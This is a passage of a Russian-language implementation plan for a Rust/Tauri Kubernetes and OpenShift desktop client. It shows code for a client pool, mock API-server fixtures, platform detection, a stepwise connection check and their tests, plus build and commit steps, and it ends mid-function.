        user,
        groups,
        server_version: d.server_version,
        platform: d.platform,
        api_groups: d.api_groups,
        capabilities,
    })
}

#[cfg(test)]
pub(crate) mod fixtures {
    use crate::k8s::testing::Seen;

    /// Ответы кластера OpenShift: пользователь `dev1`, разрешены только проекты и поды
    /// (ClusterVersion и ноды не читаются).
    pub fn openshift(s: &Seen) -> (u16, serde_json::Value) {
        match s.path() {
            "/apis/authentication.k8s.io/v1/selfsubjectreviews" => (
                201,
                serde_json::json!({"apiVersion": "authentication.k8s.io/v1", "kind": "SelfSubjectReview",
                    "metadata": {}, "status": {"userInfo": {"username": "dev1",
                    "groups": ["system:authenticated", "team-a"]}}}),
            ),
            "/version" => (
                200,
                serde_json::json!({"major": "1", "minor": "32", "gitVersion": "v1.32.5",
                    "gitCommit": "x", "gitTreeState": "clean", "buildDate": "2026-01-01T00:00:00Z",
                    "goVersion": "go1.23", "compiler": "gc", "platform": "linux/amd64"}),
            ),
            "/apis" => (
                200,
                serde_json::json!({"kind": "APIGroupList", "apiVersion": "v1", "groups": [
                    {"name": "apps", "versions": [{"groupVersion": "apps/v1", "version": "v1"}]},
                    {"name": "config.openshift.io", "versions": [{"groupVersion": "config.openshift.io/v1", "version": "v1"}]},
                    {"name": "route.openshift.io", "versions": [{"groupVersion": "route.openshift.io/v1", "version": "v1"}]},
                    {"name": "project.openshift.io", "versions": [{"groupVersion": "project.openshift.io/v1", "version": "v1"}]},
                    {"name": "apps.openshift.io", "versions": [{"groupVersion": "apps.openshift.io/v1", "version": "v1"}]}
                ]}),
            ),
            "/apis/config.openshift.io/v1/clusterversions/version" => crate::k8s::testing::status(
                403,
                "Forbidden",
                r#"clusterversions.config.openshift.io "version" is forbidden: User "dev1" cannot get resource "clusterversions" in API group "config.openshift.io" at the cluster scope"#,
            ),
            "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" => {
                let attrs = &s.body["spec"]["resourceAttributes"];
                let allowed = matches!(attrs["resource"].as_str(), Some("projects" | "pods"));
                (
                    201,
                    serde_json::json!({"apiVersion": "authorization.k8s.io/v1",
                        "kind": "SelfSubjectAccessReview", "metadata": {}, "spec": {},
                        "status": {"allowed": allowed}}),
                )
            }
            other => crate::k8s::testing::status(404, "NotFound", &format!("{other} not found")),
        }
    }
}
````

<!-- block: file t06-src-tauri-src-k8s-pool-rs-impl step=6.2 path=src-tauri/src/k8s/pool.rs part=impl -->
````rust
//! Подключённые кластеры: один `kube::Client` и сведения о подключении на профиль (спец. §4.1).

use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use crate::error::{AppError, AppResult};
use crate::k8s::cluster::{ConnectionInfo, probe};
use crate::k8s::config::{build_kube_config, process_env, request_timeout};
use crate::k8s::errors::from_kube;
use crate::secrets::SecretStore;
use crate::storage::profile::ConnectionProfile;
use crate::sync::MutexExt;

pub struct Connected {
    pub client: kube::Client,
    pub info: ConnectionInfo,
    /// Таймаут одного запроса (из профиля).
    pub timeout: Duration,
}

/// Клиенты подключений. Поколение растёт при каждом сбросе: клиент, который подключался
/// дольше, чем жил профиль (его сохранили или удалили), в пул не попадает.
#[derive(Default)]
pub struct ClientPool {
    inner: Mutex<PoolInner>,
}

#[derive(Default)]
struct PoolInner {
    clients: HashMap<String, Arc<Connected>>,
    generations: HashMap<String, u64>,
}

impl ClientPool {
    pub fn get(&self, id: &str) -> Option<Arc<Connected>> {
        self.inner.lock_safe().clients.get(id).cloned()
    }

    pub fn generation(&self, id: &str) -> u64 {
        self.inner
            .lock_safe()
            .generations
            .get(id)
            .copied()
            .unwrap_or(0)
    }

    /// Кладёт клиент, только если подключение не сбрасывали с момента `generation`.
    pub fn insert_if_current(&self, id: &str, generation: u64, c: Arc<Connected>) -> bool {
        let mut inner = self.inner.lock_safe();
        if inner.generations.get(id).copied().unwrap_or(0) != generation {
            return false;
        }
        inner.clients.insert(id.to_string(), c);
        true
    }

    /// Сбрасывает клиент подключения. `true` — клиент был.
    pub fn evict(&self, id: &str) -> bool {
        let mut inner = self.inner.lock_safe();
        *inner.generations.entry(id.to_string()).or_default() += 1;
        inner.clients.remove(id).is_some()
    }
}

/// Новое подключение: клиент из профиля (keychain — на blocking-потоке) и `probe`.
pub async fn open(
    profile: ConnectionProfile,
    secrets: Arc<dyn SecretStore>,
) -> AppResult<Connected> {
    let timeout = request_timeout(&profile);
    let config = tokio::task::spawn_blocking(move || {
        build_kube_config(&profile, secrets.as_ref(), &process_env)
    })
    .await
    .map_err(|e| AppError::internal_with(e.to_string()))??;
    let client = kube::Client::try_from(config).map_err(|e| from_kube(&e))?;
    let info = probe(&client, timeout).await?;
    Ok(Connected {
        client,
        info,
        timeout,
    })
}
````

<!-- block: file t06-src-tauri-src-k8s-testing-rs step=6.2 path=src-tauri/src/k8s/testing.rs -->
````rust
//! Мок API-сервера для тестов: `kube::Client` поверх `tower_test`, ответы — функцией от запроса.

use http::{Request, Response};
use http_body_util::BodyExt;
use kube::client::Body;

/// Запрос, который увидел мок.
#[derive(Debug, Clone)]
pub struct Seen {
    pub method: http::Method,
    /// Путь вместе со строкой запроса: `/api/v1/pods?&limit=500`.
    pub uri: String,
    pub body: serde_json::Value,
}

impl Seen {
    pub fn path(&self) -> &str {
        self.uri.split('?').next().unwrap_or("")
    }
}

/// Клиент, все запросы которого обрабатывает `handler` (код ответа и JSON). Задача завершается,
/// когда клиент удалён, и возвращает список увиденных запросов.
pub fn mock_client(
    handler: impl Fn(&Seen) -> (u16, serde_json::Value) + Send + 'static,
) -> (kube::Client, tokio::task::JoinHandle<Vec<Seen>>) {
    let (svc, mut handle) = tower_test::mock::pair::<Request<Body>, Response<Body>>();
    let task = tokio::spawn(async move {
        let mut seen = Vec::new();
        while let Some((req, send)) = handle.next_request().await {
            let method = req.method().clone();
            let uri = req
                .uri()
                .path_and_query()
                .map(|p| p.to_string())
                .unwrap_or_default();
            let bytes = req.into_body().collect().await.unwrap().to_bytes();
            let body = if bytes.is_empty() {
                serde_json::Value::Null
            } else {
                serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null)
            };
            let s = Seen { method, uri, body };
            let (code, json) = handler(&s);
            seen.push(s);
            send.send_response(
                Response::builder()
                    .status(code)
                    .body(Body::from(serde_json::to_vec(&json).unwrap()))
                    .unwrap(),
            );
        }
        seen
    });
    (kube::Client::new(svc, "default"), task)
}

/// Ответ API-сервера об ошибке (`kind: Status`).
pub fn status(code: u16, reason: &str, message: &str) -> (u16, serde_json::Value) {
    (
        code,
        serde_json::json!({"kind": "Status", "apiVersion": "v1", "metadata": {}, "status": "Failure",
            "message": message, "reason": reason, "code": code}),
    )
}
````

<!-- block: file t06-src-tauri-src-platform-mod-rs-impl step=6.2 path=src-tauri/src/platform/mod.rs part=impl -->
````rust
//! Платформа кластера (спец. §4.3) — то, что у вендоров устроено по-разному и из групп API
//! не выводится. Определяется чистой функцией `detect` по discovery при подключении; ручного выбора
//! в профиле нет. Какие объекты читать и показывать, решают группы API (`ApiGroups`), а не
//! платформа. Поведение, которое зависит от платформы (обзор кластера, автопоиск метрик), добавляют
//! следующие этапы.

use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum PlatformKind {
    Openshift,
    /// Любой другой Kubernetes; Platform V DropApp — тоже, пока нет его адаптера (этап O5).
    Kubernetes,
}

/// Справочный дистрибутив платформы `kubernetes`: виден в интерфейсе и MCP и влияет только
/// на порядок кандидатов автопоиска метрик (этап O3).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Distribution {
    Eks,
    Gke,
    Aks,
    Rancher,
    Deckhouse,
    K3s,
    Rke2,
}

impl Distribution {
    /// Название в интерфейсе (не переводится).
    pub fn title(self) -> &'static str {
        match self {
            Distribution::Eks => "EKS",
            Distribution::Gke => "GKE",
            Distribution::Aks => "AKS",
            Distribution::Rancher => "Rancher",
            Distribution::Deckhouse => "Deckhouse",
            Distribution::K3s => "k3s",
            Distribution::Rke2 => "RKE2",
        }
    }
}

/// Что кластер сообщил о себе: группы API, `/version`, версия ClusterVersion и метки ноды.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Discovery {
    /// `group/version` всех групп API из `/apis`, например `route.openshift.io/v1`.
    pub group_versions: Vec<String>,
    /// `gitVersion` из `/version`, например `v1.31.4-eks-a737599`.
    pub git_version: String,
    /// `status.desired.version` объекта ClusterVersion OpenShift, если он читается:
    /// `4.18.3`, `4.15.0-0.okd-2024-03-10-010116`.
    pub cluster_version: Option<String>,
    /// Имена меток первой ноды, если ноды читаются.
    pub node_labels: Vec<String>,
}

impl Discovery {
    pub fn has_group(&self, group: &str) -> bool {
        self.group_versions
            .iter()
            .any(|gv| gv.split_once('/').is_some_and(|(g, _)| g == group))
    }

    fn has_group_matching(&self, f: impl Fn(&str) -> bool) -> bool {
        self.group_versions
            .iter()
            .any(|gv| gv.split_once('/').is_some_and(|(g, _)| f(g)))
    }
}

/// Группы API, от которых зависит, какие объекты Glafira читает и показывает (спец. §4.3).
/// Правило одно для всех платформ: кластер Kubernetes с CRD `Route` покажет Route.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ApiGroups {
    /// `route.openshift.io` — Route.
    pub routes: bool,
    /// `project.openshift.io` — проекты вместо списка namespace.
    pub projects: bool,
    /// `apps.openshift.io` — DeploymentConfig.
    pub deployment_configs: bool,
    /// `gateway.networking.k8s.io/v1` — Gateway API (Gateway, HTTPRoute, GRPCRoute).
    pub gateway_api: bool,
}

impl ApiGroups {
    pub fn of(d: &Discovery) -> Self {
        Self {
            routes: d.has_group("route.openshift.io"),
            projects: d.has_group("project.openshift.io"),
            deployment_configs: d.has_group("apps.openshift.io"),
            gateway_api: d
                .group_versions
                .iter()
                .any(|gv| gv == "gateway.networking.k8s.io/v1"),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PlatformInfo {
    pub kind: PlatformKind,
    pub distribution: Option<Distribution>,
    /// Версия платформы «major.minor»: OpenShift — из ClusterVersion (если он читается),
    /// Kubernetes — из `/version`.
    pub version: Option<String>,
    /// Название в интерфейсе и MCP: «OpenShift 4.18», «OKD 4.15», «Kubernetes 1.31 (EKS)».
    pub label: String,
}

/// «major.minor» из строки версии: `v1.31.4-eks-a737599` → `1.31`, `4.18.3` → `4.18`.
fn major_minor(v: &str) -> Option<String> {
    let mut parts = v.trim().trim_start_matches('v').split('.');
    let major = parts
        .next()
        .filter(|p| p.chars().all(|c| c.is_ascii_digit()) && !p.is_empty())?;
    let minor: String = parts
        .next()?
        .chars()
        .take_while(char::is_ascii_digit)
        .collect();
    (!minor.is_empty()).then(|| format!("{major}.{minor}"))
}

fn distribution(d: &Discovery) -> Option<Distribution> {
    let v = d.git_version.as_str();
    if v.contains("-eks-") {
        Some(Distribution::Eks)
    } else if v.contains("-gke.") {
        Some(Distribution::Gke)
    } else if d
        .node_labels
        .iter()
        .any(|l| l.starts_with("kubernetes.azure.com/"))
    {
        Some(Distribution::Aks)
    } else if d.has_group_matching(|g| g.ends_with(".cattle.io")) {
        Some(Distribution::Rancher)
    } else if d.has_group_matching(|g| g == "deckhouse.io" || g.ends_with(".deckhouse.io")) {
        Some(Distribution::Deckhouse)
    } else if v.contains("+k3s") {
        Some(Distribution::K3s)
    } else if v.contains("+rke2") {
        Some(Distribution::Rke2)
    } else {
        None
    }
}

/// Платформа по discovery (спец. §4.3). Признаки проверяются по порядку: группа
/// `config.openshift.io` → `openshift`; признак DropApp — этап O5; иначе `kubernetes`.
pub fn detect(d: &Discovery) -> PlatformInfo {
    if d.has_group("config.openshift.io") {
        let full = d.cluster_version.as_deref().unwrap_or("");
        let version = major_minor(full);
        let name = if full.contains("okd") {
            "OKD"
        } else {
            "OpenShift"
        };
        let label = match &version {
            Some(v) => format!("{name} {v}"),
            None => name.to_string(),
        };
        return PlatformInfo {
            kind: PlatformKind::Openshift,
            distribution: None,
            version,
            label,
        };
    }
    let distribution = distribution(d);
    let version = major_minor(&d.git_version);
    let mut label = match &version {
        Some(v) => format!("Kubernetes {v}"),
        None => "Kubernetes".to_string(),
    };
    if let Some(dist) = distribution {
        label.push_str(&format!(" ({})", dist.title()));
    }
    PlatformInfo {
        kind: PlatformKind::Kubernetes,
        distribution,
        version,
        label,
    }
}
````

<!-- block: patch t06-src step=6.2 -->
````diff
diff --git a/src-tauri/src/commands/folders.rs b/src-tauri/src/commands/folders.rs
--- a/src-tauri/src/commands/folders.rs
+++ b/src-tauri/src/commands/folders.rs
@@ -154,11 +154,16 @@ fn import_from_file(
     if !apply {
         return Ok(plan_import(&st.connections.snapshot(), &parsed, &opts)?.preview);
     }
-    st.connections.update(|data| {
+    let preview = st.connections.update(|data| {
         let plan = plan_import(data, &parsed, &opts)?;
         *data = plan.next;
         Ok(plan.preview)
-    })
+    })?;
+    // Обновлённые подключения переподключатся с новым профилем — как при сохранении формы.
+    for item in &preview.updated {
+        st.evict_connection(&item.id);
+    }
+    Ok(preview)
 }
 
 #[cfg(test)]
diff --git a/src-tauri/src/k8s/mod.rs b/src-tauri/src/k8s/mod.rs
--- a/src-tauri/src/k8s/mod.rs
+++ b/src-tauri/src/k8s/mod.rs
@@ -1,4 +1,8 @@
 //! Работа с API-сервером: сборка клиента из профиля, ошибки, подключение и проверка.
 
+pub mod cluster;
 pub mod config;
 pub mod errors;
+pub mod pool;
+#[cfg(test)]
+pub(crate) mod testing;
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -5,6 +5,7 @@ mod dock_name;
 pub mod error;
 pub mod k8s;
 pub mod logging;
+pub mod platform;
 pub mod policy;
 pub mod product;
 pub mod secrets;
diff --git a/src-tauri/src/state.rs b/src-tauri/src/state.rs
--- a/src-tauri/src/state.rs
+++ b/src-tauri/src/state.rs
@@ -1,17 +1,20 @@
 use std::path::Path;
 use std::sync::Arc;
 
-use crate::error::AppResult;
+use crate::error::{AppError, AppResult, ErrorCode};
+use crate::k8s::pool::{ClientPool, Connected, open};
 use crate::secrets::SecretStore;
 use crate::storage::connections::ConnectionStore;
 
-/// Общее состояние приложения: хранилища и политика. Клонируется дёшево (всё за `Arc`).
+/// Общее состояние приложения: хранилища, политика и подключённые кластеры.
+/// Клонируется дёшево (всё за `Arc`).
 #[derive(Clone)]
 pub struct AppState {
     pub connections: Arc<ConnectionStore>,
     pub secrets: Arc<dyn SecretStore>,
     pub policy: Arc<crate::policy::Policy>,
     pub settings: Arc<crate::settings::SettingsStore>,
+    pub pool: Arc<ClientPool>,
 }
 
 impl AppState {
@@ -21,6 +24,7 @@ impl AppState {
             secrets,
             policy: Arc::new(crate::policy::Policy::default()),
             settings: Arc::new(crate::settings::SettingsStore::open(data_dir)),
+            pool: Arc::new(ClientPool::default()),
         })
     }
 
@@ -29,4 +33,105 @@ impl AppState {
         self.policy = Arc::new(policy);
         self
     }
+
+    /// Клиент подключения: из пула или новое подключение (`fresh` — всегда новое).
+    pub async fn connected(&self, id: &str, fresh: bool) -> AppResult<Arc<Connected>> {
+        if fresh {
+            self.pool.evict(id);
+        } else if let Some(c) = self.pool.get(id) {
+            return Ok(c);
+        }
+        let generation = self.pool.generation(id);
+        let profile = self.connections.get(id)?;
+        let c = Arc::new(open(profile, self.secrets.clone()).await?);
+        self.pool.insert_if_current(id, generation, c.clone());
+        Ok(c)
+    }
+
+    /// Сбрасывает клиент, если ошибка значит, что с этими учётными данными или TLS он работать
+    /// не будет: следующий вызов подключится заново и подхватит новый токен.
+    pub fn evict_if_broken(&self, id: &str, e: &AppError) -> bool {
+        let broken = matches!(
+            e.code,
+            ErrorCode::SessionExpired | ErrorCode::AuthFailed | ErrorCode::TlsError
+        );
+        if broken {
+            self.pool.evict(id);
+        }
+        broken
+    }
+
+    pub fn evict_connection(&self, id: &str) {
+        self.pool.evict(id);
+    }
+
+    /// Удаляет подключение целиком: профиль, секреты и клиент. Блокирующий вызов (keychain).
+    pub fn delete_connection_full(&self, id: &str) -> AppResult<()> {
+        self.connections.delete(id)?;
+        for field in crate::secrets::CONNECTION_SECRET_FIELDS {
+            self.secrets
+                .delete(&crate::secrets::secret_key(id, field))?;
+        }
+        self.evict_connection(id);
+        Ok(())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::i18n::LocalizedText;
+    use crate::secrets::MemoryStore;
+    use crate::storage::connections::sample_profile;
+
+    fn state(dir: &Path) -> AppState {
+        AppState::new(dir, Arc::new(MemoryStore::default())).unwrap()
+    }
+
+    #[tokio::test]
+    async fn unknown_connection_is_not_found() {
+        let dir = tempfile::tempdir().unwrap();
+        let st = state(dir.path());
+        let e = st.connected("nope", false).await.err().unwrap();
+        assert_eq!(e.code, ErrorCode::NotFound);
+    }
+
+    #[test]
+    fn delete_connection_removes_all_secrets() {
+        let dir = tempfile::tempdir().unwrap();
+        let st = state(dir.path());
+        st.connections.upsert(sample_profile("a")).unwrap();
+        for f in crate::secrets::CONNECTION_SECRET_FIELDS {
+            st.secrets
+                .set(&crate::secrets::secret_key("a", f), "x")
+                .unwrap();
+        }
+        st.delete_connection_full("a").unwrap();
+        assert!(st.connections.get("a").is_err());
+        for f in crate::secrets::CONNECTION_SECRET_FIELDS {
+            assert_eq!(
+                st.secrets.get(&crate::secrets::secret_key("a", f)).unwrap(),
+                None,
+                "{f}"
+            );
+        }
+    }
+
+    #[test]
+    fn only_credential_errors_evict() {
+        let dir = tempfile::tempdir().unwrap();
+        let st = state(dir.path());
+        for (code, evicts) in [
+            (ErrorCode::SessionExpired, true),
+            (ErrorCode::AuthFailed, true),
+            (ErrorCode::TlsError, true),
+            (ErrorCode::Timeout, false),
+            (ErrorCode::Forbidden, false),
+        ] {
+            let before = st.pool.generation("a");
+            let e = AppError::localized(code, LocalizedText::raw("x"));
+            assert_eq!(st.evict_if_broken("a", &e), evicts, "{code:?}");
+            assert_eq!(st.pool.generation("a") > before, evicts, "{code:?}");
+        }
+    }
 }
````

Применить: `python3 /tmp/o1a-blocks.py step 6.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 122 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(k8s): подключение — пул клиентов, пользователь, платформа и группы API, права" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 7: Пошаговая проверка подключения

**Files:**
- Create: `src-tauri/src/k8s/connectivity.rs`
- Modify: `src-tauri/src/k8s/cluster.rs`, `src-tauri/src/k8s/mod.rs`

**Interfaces:**
- Consumes: задачи 3, 5–6.
- Produces: `k8s::cluster::list_project_names(client, limit, projects_api) -> AppResult<(Vec<String>, bool)>` (первые 500 и «есть ещё»); `k8s::connectivity::{TestStep { name, ok, message, error }, TestReport { ok, steps }, ensure_allowed(&ConnectionProfile, &PolicyStatus), tcp_target(&kube::Config) -> (String, u16, bool), tcp_probe(host, port, limit), check_cluster(&mut Vec<TestStep>, &kube::Client, &ConnectionProfile) -> bool, test_connection(&ConnectionProfile, Arc<dyn SecretStore>, &PolicyStatus) -> TestReport}`; ключи `messages.connectionTest.*`.

Спец. §5.3. Шаги `config` → `tcp` → `tls` → `auth` → `discovery` → `projects` (шаг `exec` между TCP и TLS добавляет задача 10); проверка останавливается на первом неуспешном. TLS и вход проверяются одним запросом «кто я»: ошибка TLS или сети — шаг `tls`, 401 — шаг `auth`. TCP идёт до прокси, если он задан. Шаг `discovery` называет платформу, версию API-сервера и найденные группы OpenShift и Gateway API; список проектов берётся из `projects` или `namespaces` — по группе `project.openshift.io`. Если кластер не даёт список проектов, а в профиле есть ручной список, шаг `projects` успешен с пояснением. Политика проверяется функцией `ensure_allowed(профиль, &PolicyStatus)` — её же вызывают сохранение и подключение (задача 12); `allowInsecureTls = false` останавливает проверку на шаге `config`.

- [ ] **Step 1: Тесты.**

<!-- block: file t07-src-tauri-src-k8s-connectivity-rs-tests step=7.1 path=src-tauri/src/k8s/connectivity.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::k8s::cluster::fixtures;
    use crate::k8s::testing::{mock_client, status};
    use crate::secrets::{MemoryStore, TOKEN, secret_key};
    use crate::storage::profile::sample_profile;

    fn names(steps: &[TestStep]) -> Vec<(&str, bool)> {
        steps.iter().map(|s| (s.name, s.ok)).collect()
    }

    #[tokio::test]
    async fn all_cluster_steps_pass_on_openshift() {
        let (client, _server) = mock_client(fixtures::openshift);
        let mut steps = Vec::new();
        assert!(check_cluster(&mut steps, &client, &sample_profile("a")).await);
        assert_eq!(
            names(&steps),
            [
                ("tls", true),
                ("auth", true),
                ("discovery", true),
                ("projects", true)
            ]
        );
        assert_eq!(steps[1].message.params["user"], "dev1");
        assert_eq!(
            steps[2].message.key,
            "messages.connectionTest.discoveryGroups"
        );
        assert_eq!(steps[2].message.params["platform"], "OpenShift");
        assert_eq!(
            steps[2].message.params["groups"],
            "Route, Project, DeploymentConfig"
        );
        assert_eq!(steps[3].message.params["count"], "2");
    }

    #[tokio::test]
    async fn plain_kubernetes_lists_namespaces() {
        let (client, server) = mock_client(|s| match s.path() {
            "/apis" => (
                200,
                serde_json::json!({"kind": "APIGroupList", "apiVersion": "v1",
                    "groups": [{"name": "apps", "versions": [{"groupVersion": "apps/v1", "version": "v1"}]}]}),
            ),
            "/api/v1/namespaces" => (
                200,
                serde_json::json!({"apiVersion": "v1", "kind": "NamespaceList", "metadata": {},
                    "items": [{"metadata": {"name": "default"}}, {"metadata": {"name": "team-a"}}]}),
            ),
            _ => fixtures::openshift(s),
        });
        let mut steps = Vec::new();
        assert!(check_cluster(&mut steps, &client, &sample_profile("a")).await);
        assert_eq!(steps[2].message.key, "messages.connectionTest.discovery");
        assert_eq!(steps[2].message.params["platform"], "Kubernetes 1.32");
        assert_eq!(steps[3].message.params["count"], "2");
        drop(client);
        let seen = server.await.unwrap();
        assert!(
            !seen
                .iter()
                .any(|s| s.path().contains("project.openshift.io"))
        );
    }

    #[tokio::test]
    async fn rejected_token_fails_auth_after_tls() {
        let (client, _server) = mock_client(|_| status(401, "Unauthorized", "Unauthorized"));
        let mut steps = Vec::new();
        assert!(!check_cluster(&mut steps, &client, &sample_profile("a")).await);
        assert_eq!(names(&steps), [("tls", true), ("auth", false)]);
        assert_eq!(
            steps[1].error.as_ref().unwrap().code,
            ErrorCode::SessionExpired
        );
    }

    #[tokio::test]
    async fn forbidden_projects_fall_back_to_profile_list() {
        let (client, _server) = mock_client(|s| match s.path() {
            "/apis/project.openshift.io/v1/projects" => status(
                403,
                "Forbidden",
                r#"projects.project.openshift.io is forbidden: User "u" cannot list resource "projects" in API group "project.openshift.io" at the cluster scope"#,
            ),
            _ => fixtures::openshift(s),
        });
        let mut p = sample_profile("a");
        let mut steps = Vec::new();
        assert!(!check_cluster(&mut steps, &client, &p).await);
        assert_eq!(
            steps[3].error.as_ref().unwrap().key,
            "errors.k8s.forbiddenCluster"
        );
        p.manual_namespaces = vec!["team-a".into()];
        let mut steps = Vec::new();
        assert!(check_cluster(&mut steps, &client, &p).await);
        assert_eq!(
            steps[3].message.key,
            "messages.connectionTest.projectsManual"
        );
    }

    #[tokio::test]
    async fn tcp_probe_reaches_listener_and_reports_refused_port() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let addr = tcp_probe("127.0.0.1", port, Duration::from_secs(2))
            .await
            .unwrap();
        assert_eq!(addr, format!("127.0.0.1:{port}"));
        drop(listener);
        let e = tcp_probe("127.0.0.1", port, Duration::from_secs(2))
            .await
            .unwrap_err();
        assert_eq!(e.code, ErrorCode::ConnectionFailed);
    }

    #[test]
    fn tcp_goes_to_proxy_when_set() {
        let mut c = kube::Config::new("https://api.c:6443".parse().unwrap());
        assert_eq!(tcp_target(&c), ("api.c".into(), 6443, false));
        c.proxy_url = Some("http://proxy:3128".parse().unwrap());
        assert_eq!(tcp_target(&c), ("proxy".into(), 3128, true));
        let c = kube::Config::new("https://api.c".parse().unwrap());
        assert_eq!(tcp_target(&c).1, 443);
    }

    #[tokio::test]
    async fn config_errors_stop_before_network() {
        let open = PolicyStatus::default();
        let strict = PolicyStatus {
            allow_insecure_tls: false,
            ..PolicyStatus::default()
        };
        // Нет токена.
        let r = test_connection(
            &sample_profile("a"),
            Arc::new(MemoryStore::default()),
            &open,
        )
        .await;
        assert!(!r.ok);
        assert_eq!(names(&r.steps), [("config", false)]);
        assert_eq!(
            r.steps[0].error.as_ref().unwrap().key,
            "errors.connections.tokenMissing"
        );
        // Политика запрещает insecure.
        let mut p = sample_profile("a");
        p.ca = CaConfig::Insecure;
        let secrets = MemoryStore::default();
        secrets.set(&secret_key("a", TOKEN), "t").unwrap();
        let r = test_connection(&p, Arc::new(secrets), &strict).await;
        assert_eq!(
            r.steps[0].error.as_ref().unwrap().key,
            "errors.connections.insecureForbidden"
        );
        // Невалидный профиль.
        let mut p = sample_profile("a");
        p.api_url = "http://api.c:6443".into();
        let r = test_connection(&p, Arc::new(MemoryStore::default()), &open).await;
        assert_eq!(
            r.steps[0].error.as_ref().unwrap().key,
            "errors.connections.httpsRequired"
        );
    }

    #[tokio::test]
    async fn closed_port_fails_tcp_step() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        drop(listener);
        let mut p = sample_profile("a");
        p.api_url = format!("https://127.0.0.1:{port}");
        p.proxy = crate::storage::profile::ProxyConfig::None;
        let secrets = MemoryStore::default();
        secrets.set(&secret_key("a", TOKEN), "t").unwrap();
        let r = test_connection(&p, Arc::new(secrets), &PolicyStatus::default()).await;
        assert_eq!(names(&r.steps), [("config", true), ("tcp", false)]);
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 7.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t07-src-tauri-src-k8s-connectivity-rs-impl step=7.2 path=src-tauri/src/k8s/connectivity.rs part=impl -->
````rust
//! Пошаговая проверка подключения (спец. §5.3): конфигурация → TCP → TLS → вход → discovery →
//! проекты. Останавливается на первом неуспешном шаге и называет его.

use std::sync::Arc;
use std::time::Duration;

use serde::Serialize;

use crate::error::{AppError, AppResult, ErrorCode};
use crate::i18n::LocalizedText;
use crate::k8s::cluster::{Discovered, discover, list_project_names, whoami};
use crate::k8s::config::{build_kube_config, process_env, request_timeout};
use crate::k8s::errors::from_kube;
use crate::policy::PolicyStatus;
use crate::secrets::SecretStore;
use crate::storage::profile::{CaConfig, ConnectionProfile};

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TestStep {
    pub name: &'static str,
    pub ok: bool,
    pub message: LocalizedText,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<AppError>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TestReport {
    pub ok: bool,
    pub steps: Vec<TestStep>,
}

fn passed(name: &'static str, message: LocalizedText) -> TestStep {
    TestStep {
        name,
        ok: true,
        message,
        error: None,
    }
}

fn failed_step(name: &'static str, e: AppError) -> TestStep {
    TestStep {
        name,
        ok: false,
        message: e.text(),
        error: Some(e),
    }
}

/// Запрещено ли подключение политикой (спец. §12).
pub fn ensure_allowed(p: &ConnectionProfile, policy: &PolicyStatus) -> AppResult<()> {
    if p.ca == CaConfig::Insecure && !policy.allow_insecure_tls {
        return Err(app_err!(
            ErrorCode::InvalidInput,
            "errors.connections.insecureForbidden",
            "Connections without TLS certificate verification are forbidden by your organization"
        ));
    }
    Ok(())
}

/// Куда открыть TCP: прокси, если он задан, иначе API-сервер (порт по умолчанию — 443).
pub fn tcp_target(config: &kube::Config) -> (String, u16, bool) {
    let (uri, via_proxy) = match &config.proxy_url {
        Some(p) => (p, true),
        None => (&config.cluster_url, false),
    };
    let host = uri
        .host()
        .unwrap_or("")
        .trim_start_matches('[')
        .trim_end_matches(']');
    let port = uri
        .port_u16()
        .unwrap_or(if uri.scheme_str() == Some("http") {
            80
        } else {
            443
        });
    (host.to_string(), port, via_proxy)
}

/// TCP-соединение с `host:port` за `limit`. Возвращает адрес, с которым соединились.
pub async fn tcp_probe(host: &str, port: u16, limit: Duration) -> AppResult<String> {
    let addrs: Vec<_> =
        match tokio::time::timeout(limit, tokio::net::lookup_host((host, port))).await {
            Ok(Ok(a)) => a.collect(),
            Ok(Err(e)) => {
                return Err(app_err!(
                    ErrorCode::ConnectionFailed,
                    "errors.k8s.dns",
                    "Cannot resolve the server host name"
                )
                .with_details(e.to_string()));
            }
            Err(_) => return Err(crate::k8s::errors::timeout()),
        };
    let mut last = None;
    for addr in addrs {
        match tokio::time::timeout(limit, tokio::net::TcpStream::connect(addr)).await {
            Ok(Ok(_)) => return Ok(addr.to_string()),
            Ok(Err(e)) => last = Some(e.to_string()),
            Err(_) => last = Some("timed out".into()),
        }
    }
    Err(app_err!(
        ErrorCode::ConnectionFailed,
        "errors.k8s.connect",
        "Cannot connect to the server"
    )
    .with_details(last.unwrap_or_else(|| format!("{host}: no addresses"))))
}

/// Платформа, версия API-сервера и найденные группы API OpenShift и Gateway API
/// (названия видов не переводятся).
fn discovery_message(d: &Discovered) -> LocalizedText {
    let g = &d.api_groups;
    let found: Vec<&str> = [
